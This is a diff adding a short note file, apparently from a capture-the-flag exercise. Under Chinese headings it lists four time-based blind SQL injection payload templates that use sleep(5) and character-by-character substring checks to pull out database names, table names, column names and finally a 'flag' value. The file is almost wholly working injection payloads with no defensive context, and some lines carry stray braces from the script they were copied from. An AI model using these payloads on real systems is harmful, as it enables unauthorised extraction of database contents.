@@ -1,0 +1,10 @@
+爆破数据库
+'(select case when (substring((select schema_name from information_schema.SCHEMATA limit 1 offset %d) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(database_number,i,str)
+爆破表
+'(select case when (substring((select table_name from information_schema.TABLES where table_schema='web4' limit 1 offset %d) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(database_number,i,str)}
+爆破字段        
+'(select case when (substring((select COLUMN_name from information_schema.COLUMNS where table_name='flag' limit 1 offset %d) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(database_number,i,str)}
+爆破内容
+'(select case when (substring((select flag from flag limit 1 offset %d) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(database_number,i+1,str)}
+
+
